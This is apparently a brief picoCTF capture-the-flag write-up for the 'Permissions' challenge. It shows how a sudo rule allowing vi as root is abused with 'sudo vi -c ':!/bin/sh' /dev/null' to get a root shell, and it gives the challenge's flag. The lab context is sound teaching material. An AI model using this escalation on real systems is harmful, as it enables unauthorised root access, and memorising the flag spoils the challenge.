# Permissions

Can you read files in the root file?

-----

Connecting to the provided instance via SSH and running `sudo -l`, we see that we are able to run `/usr/bin/vi` with `root` privileges:

![[picoctf/images/Pasted image 20250224164632.png]]

Using [vi as a GTFOBin](https://gtfobins.github.io/gtfobins/vi/),w e can run the following to spawn an interactive shell as `root`:

```
$ sudo vi -c ':!/bin/sh' /dev/null
```

We can then read the `/root/.flag.txt` file:

```
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```